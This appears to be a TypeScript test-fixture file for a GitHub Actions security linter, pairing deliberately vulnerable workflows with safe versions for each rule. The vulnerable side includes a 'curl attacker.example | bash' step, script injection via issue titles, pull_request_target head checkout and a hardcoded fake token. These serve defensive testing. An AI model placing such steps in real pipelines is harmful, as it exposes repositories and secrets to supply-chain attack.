const SHA = '0123456789abcdef0123456789abcdef01234567'

export const fixtures: Record<string, { vulnerable: string; safe: string }> = {
  'SPS-001': {
    vulnerable: `name: pin\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: example-org/deploy@v1\n`,
    safe: `name: pin\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: example-org/deploy@${SHA}\n`,
  },
  'SPS-002': {
    vulnerable: `name: first\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n`,
    safe: `name: first\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${SHA}\n`,
  },
  'SPS-003': {
    vulnerable: `name: image\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://alpine:3.19\n`,
    safe: `name: image\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://alpine@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n`,
  },
  'SPS-010': {
    vulnerable: `name: perms\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
    safe: `name: perms\non: push\npermissions: {}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
  },
  'SPS-011': {
    vulnerable: `name: wide\non: push\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
    safe: `name: wide\non: push\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
  },
  'SPS-020': {
    vulnerable: `name: inject\non:\n  issues:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "\${{ github.event.issue.title }}"\n`,
    safe: `name: inject\non:\n  issues:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          TITLE: \${{ github.event.issue.title }}\n        run: echo "$TITLE"\n`,
  },
  'SPS-030': {
    vulnerable: `name: pr\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${SHA}\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n`,
    safe: `name: pr\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false\n      - run: echo "base branch only"\n`,
  },
  'SPS-031': {
    vulnerable: `name: artifacts\non:\n  workflow_run:\n    workflows: ["ci.yml"]\n    types: [completed]\njobs:\n  promote:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@${SHA}\n        with:\n          name: build\n`,
    safe: `name: artifacts\non:\n  workflow_run:\n    workflows: ["ci.yml"]\n    types: [completed]\njobs:\n  promote:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "no artifact download"\n`,
  },
  'SPS-040': {
    vulnerable: `name: secret\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789\n`,
    safe: `name: secret\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          TOKEN: \${{ secrets.GITHUB_TOKEN }}\n        run: echo "token is set"\n`,
  },
  'SPS-041': {
    vulnerable: `name: inherit\non: push\njobs:\n  call:\n    uses: example-org/workflows/.github/workflows/ci.yml@${SHA}\n    secrets: inherit\n`,
    safe: `name: inherit\non: push\njobs:\n  call:\n    uses: example-org/workflows/.github/workflows/ci.yml@${SHA}\n    secrets:\n      TOKEN: \${{ secrets.TOKEN }}\n`,
  },
  'SPS-050': {
    vulnerable: `name: pipe\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.example/install.sh | bash\n`,
    safe: `name: pipe\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "no download"\n`,
  },
  'SPS-060': {
    vulnerable: `name: creds\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${SHA}\n      - uses: example-org/deploy@${SHA}\n`,
    safe: `name: creds\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false\n      - uses: example-org/deploy@${SHA}\n`,
  },
  'SPS-070': {
    vulnerable: `name: runner\non: pull_request\njobs:\n  build:\n    runs-on: self-hosted\n    steps:\n      - run: echo ok\n`,
    safe: `name: runner\non: push\njobs:\n  build:\n    runs-on: self-hosted\n    steps:\n      - run: echo ok\n`,
  },
  'SPS-080': {
    vulnerable: `name: commands\non: push\nenv:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: true\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
    safe: `name: commands\non: push\nenv:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: false\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
  },
  'SPS-090': {
    vulnerable: `name: limits\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
    safe: `name: limits\non: push\nconcurrency:\n  group: limits\n  cancel-in-progress: true\njobs:\n  build:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - run: echo ok\n`,
  },
  'SPS-091': {
    vulnerable: `name: cloud\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo ok\n`,
    safe: `name: cloud\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: aws-actions/configure-aws-credentials@${SHA}\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/example\n          aws-region: us-east-1\n`,
  },
  'SPS-100': {
    vulnerable: `name: harden\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`,
    safe: `name: harden\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: step-security/harden-runner@1d88384fd173af6ecb012dfd0264a306b711241a\n        with:\n          egress-policy: audit\n`,
  },
}

export const secureWorkflow = `name: ci
on:
  push:
  pull_request:
permissions: {}
concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read
    steps:
      - name: Harden the runner
        uses: step-security/harden-runner@1d88384fd173af6ecb012dfd0264a306b711241a # v2.22.4
        with:
          egress-policy: audit
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Setup Node
        uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
      - name: Test
        run: npm test
`

export const anchoredWorkflow = `name: anchored
on: push
permissions:
  contents: read
jobs:
  build: &base
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo one
  reuse:
    <<: *base
`
